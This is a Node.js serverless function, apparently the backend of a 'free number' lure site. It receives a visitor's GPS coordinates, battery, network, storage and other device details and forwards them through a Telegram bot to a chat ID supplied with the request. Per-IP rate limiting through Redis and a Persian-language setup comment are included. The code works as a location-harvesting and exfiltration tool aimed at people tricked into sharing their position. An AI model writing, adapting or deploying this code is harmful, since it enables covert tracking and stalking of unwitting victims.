const fetch = require('node-fetch');
const FormData = require('form-data');
const formidable = require('formidable');

const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

async function getRedisValue(key) {
  const res = await fetch(`${REDIS_URL}/get/${key}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const data = await res.json();
  return data.result;
}

async function incrementRedisKey(key, ttlSeconds = 900) {
  await fetch(`${REDIS_URL}/set/${key}/EX/${ttlSeconds}/NX`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });

  const res = await fetch(`${REDIS_URL}/incr/${key}`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });

  const data = await res.json();
  return parseInt(data.result);
}

module.exports = async (req, res) => {
  const botToken = process.env.TOKEN;
  const allowedOrigin = 'https://free-number1.vercel.app'; // ← دامنه واقعی خودت رو وارد کن

  if (req.headers.origin && req.headers.origin !== allowedOrigin) {
    return res.status(403).json({ ok: false, error: 'Invalid origin' });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }

  const form = new formidable.IncomingForm();

  form.parse(req, async (err, fields) => {
    if (err) {
      return res.status(500).json({ ok: false, error: 'Failed to parse form data.' });
    }

    const {
      chat_id: chatId,
      latitude,
      longitude,
      user_agent: userAgent,
      timezone,
      battery_level: batteryLevel,
      battery_charging: batteryCharging,
      network_type: networkType,
      network_speed: networkSpeed,
      ram,
      storage,
      country_code: countryCode
    } = fields;

    if (!chatId || !latitude || !longitude) {
      return res.status(400).json({ ok: false, error: 'Missing required parameters.' });
    }

    // ✅ بررسی لیمیت IP
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const redisKey = `rate_limit:${ip}`;

    try {
      const currentCount = await incrementRedisKey(redisKey);

      if (currentCount > 10) {
        return res.status(429).json({
          ok: false,
          error: '⛔ شما به محدودیت ۱۰ بار در ۱۵ دقیقه رسیده‌اید. لطفاً بعداً دوباره تلاش کنید.'
        });
      }

      // ارسال به تلگرام
      const now = new Date();
      const dateTime = now.toLocaleString();

      const messageText = `📍 Latitude: ${latitude}\n📍 Longitude: ${longitude}\n📅 Date: ${dateTime}\n🌍 Timezone: ${timezone}\n📶 Network: ${networkType}\n🔋 Battery: ${batteryLevel}% (${batteryCharging === 'true' ? 'Charging' : 'Not Charging'})`;

      await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ chat_id: chatId, latitude, longitude })
      });

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ chat_id: chatId, text: messageText })
      });

      return res.status(200).json({ ok: true });
    } catch (error) {
      return res.status(500).json({ ok: false, error: 'Server error: ' + error.message });
    }
  });
};
